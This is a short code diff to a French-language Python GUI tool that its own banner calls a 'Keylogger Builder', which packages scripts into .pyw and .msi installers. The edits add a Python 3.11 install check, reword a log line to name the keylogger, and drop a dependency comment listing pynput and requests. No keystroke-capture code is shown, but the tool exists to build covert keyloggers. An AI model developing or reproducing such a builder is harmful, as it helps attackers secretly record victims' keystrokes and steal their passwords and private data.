@@ -314,7 +314,12 @@ def pyw():
         messagebox.showerror("Erreur", f"❌ Erreur lors de la création:\n{str(e)}")
 
 def msi():
-    """Génère le fichier .msi"""
+    #Génère le fichier .msi
+    import os
+    import time
+    if not os.path.exists(r"\AppData\Local\Programs\Python\Python311"):
+        messagebox.showerror("Erreur", "Python 3.11 n'est pas installé. Veuillez l'installer pour continuer.")
+        return
     global nom_fichier, temp_script
     
     # Génère d'abord le .pyw
@@ -535,12 +540,10 @@ ctk.CTkLabel(
 
 # Log
 with open("logs.txt", "a", encoding="utf-8") as f:
-    f.write(f"[{time.strftime('%d-%m-%Y %H:%M:%S')}] Ouverture\n")
+    f.write(f"[{time.strftime('%d-%m-%Y %H:%M:%S')}] Ouverture du keyloger\n")
 
 def key():
     print("=" * 60)
     print("⚡ KEYLOGGER BUILDER 3D")
     print("=" * 60)
     app.mainloop()
-
-# Installation: pip install customtkinter requests pynput pillow clipboard cx_Freeze
